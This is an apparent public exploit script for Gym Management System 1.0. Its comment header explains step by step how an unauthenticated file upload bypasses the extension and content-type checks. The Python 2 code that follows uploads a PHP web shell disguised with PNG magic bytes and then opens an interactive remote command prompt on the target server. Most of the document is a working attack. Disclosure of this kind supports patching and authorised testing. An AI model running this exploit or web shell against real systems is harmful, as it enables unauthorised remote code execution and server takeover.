# Exploit Title: Gym Management System 1.0 - Unauthenticated Remote Code Execution
# Exploit Author: Bobby Cooke
# Date: 2020-05-21
# Vendor Homepage: https://projectworlds.in/
# Software Link: https://projectworlds.in/free-projects/php-projects/gym-management-system-project-in-php/
# Version: 1.0
# Tested On: Windows 10 Pro 1909 (x64_86) + XAMPP 7.4.4
# Exploit Tested Using: Python 2.7.17
# Vulnerability Description:
#   Gym Management System version 1.0 suffers from an Unauthenticated File Upload Vulnerability allowing Remote Attackers to gain Remote Code Execution (RCE) on the Hosting Webserver via uploading a maliciously crafted PHP file that bypasses the image upload filters.
# Exploit Details:
#   1. Access the '/upload.php' page, as it does not check for an authenticated user session.
#   2. Set the 'id' parameter of the GET request to the desired file name for the uploaded PHP file.
#     - `upload.php?id=kamehameha`
#     /upload.php:
#        4 $user = $_GET['id'];
#       34       move_uploaded_file($_FILES["file"]["tmp_name"],
#       35       "upload/". $user.".".$ext);
#   3. Bypass the extension whitelist by adding a double extension, with the last one as an acceptable extension (png).
#     /upload.php:
#        5 $allowedExts = array("jpg", "jpeg", "gif", "png","JPG");
#        6 $extension = @end(explode(".", $_FILES["file"]["name"]));
#       14 && in_array($extension, $allowedExts))
#   4. Bypass the file type check by modifying the 'Content-Type' of the 'file' parameter to 'image/png' in the POST request, and set the 'pupload' paramter to 'upload'.
#        7 if(isset($_POST['pupload'])){
#        8 if ((($_FILES["file"]["type"] == "image/gif")
#       11 || ($_FILES["file"]["type"] == "image/png")
#   5. In the body of the 'file' parameter of the POST request, insert the malicious PHP code:
#       <?php echo shell_exec($_GET["telepathy"]); ?>
#   6. The Web Application will rename the file to have the extension with the second item in an array created from the file name; seperated by the '.' character.
#       30           $pic=$_FILES["file"]["name"];
#       31             $conv=explode(".",$pic);
#       32             $ext=$conv['1'];
#   - Our uploaded file name was 'kaio-ken.php.png'. Therefor $conv['0']='kaio-ken'; $conv['1']='php'; $conv['2']='png';
#   7. Communicate with the webshell at '/upload.php?id=kamehameha' using GET Requests with the telepathy parameter.

import requests, sys, urllib, re
from colorama import Fore, Back, Style
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

def webshell(SERVER_URL, session):
    try:
        WEB_SHELL = SERVER_URL+'upload/kamehameha.php'
        getdir  = {'telepathy': 'echo %CD%'}
        r2 = session.get(WEB_SHELL, params=getdir, verify=False)
        status = r2.status_code
        if status != 200:
            print Style.BRIGHT+Fore.RED+"[!] "+Fore.RESET+"Could not connect to the webshell."+Style.RESET_ALL
            r2.raise_for_status()
        print(Fore.GREEN+'[+] '+Fore.RESET+'Successfully connected to webshell.')
        cwd = re.findall('[CDEF].*', r2.text)
        cwd = cwd[0]+"> "
        term = Style.BRIGHT+Fore.GREEN+cwd+Fore.RESET
        while True:
            thought = raw_input(term)
            command = {'telepathy': thought}
            r2 = requests.get(WEB_SHELL, params=command, verify=False)
            status = r2.status_code
            if status != 200:
                r2.raise_for_status()
            response2 = r2.text
            print(response2)
    except:
        print("\r\nExiting.")
        sys.exit(-1)

def formatHelp(STRING):
    return Style.BRIGHT+Fore.RED+STRING+Fore.RESET

def header():
    BL   = Style.BRIGHT+Fore.GREEN
    RS   = Style.RESET_ALL
    FR   = Fore.RESET
    SIG  = BL+'            /\\\n'+RS
    SIG += Fore.YELLOW+'/vvvvvvvvvvvv '+BL+'\\'+FR+'--------------------------------------,\n'
    SIG += Fore.YELLOW+'`^^^^^^^^^^^^'+BL+' /'+FR+'============'+Fore.RED+'BOKU'+FR+'====================="\n'
    SIG += BL+'            \/'+RS+'\n'
    return SIG

if __name__ == "__main__":
    print header();
    if len(sys.argv) != 2:
        print formatHelp("(+) Usage:\t python %s <WEBAPP_URL>" % sys.argv[0])
        print formatHelp("(+) Example:\t python %s 'https://10.0.0.3:443/gym/'" % sys.argv[0])
        sys.exit(-1)
    SERVER_URL = sys.argv[1]
    UPLOAD_DIR = 'upload.php?id=kamehameha'
    UPLOAD_URL = SERVER_URL + UPLOAD_DIR
    s = requests.Session()
    s.get(SERVER_URL, verify=False)
    PNG_magicBytes = '\x89\x50\x4e\x47\x0d\x0a\x1a'
    png     = {
                'file':
                  (
                    'kaio-ken.php.png',
                    PNG_magicBytes+'\n'+'<?php echo shell_exec($_GET["telepathy"]); ?>',
                    'image/png',
                    {'Content-Disposition': 'form-data'}
                  )
              }
    fdata   = {'pupload': 'upload'}
    r1 = s.post(url=UPLOAD_URL, files=png, data=fdata, verify=False)
    webshell(SERVER_URL, s)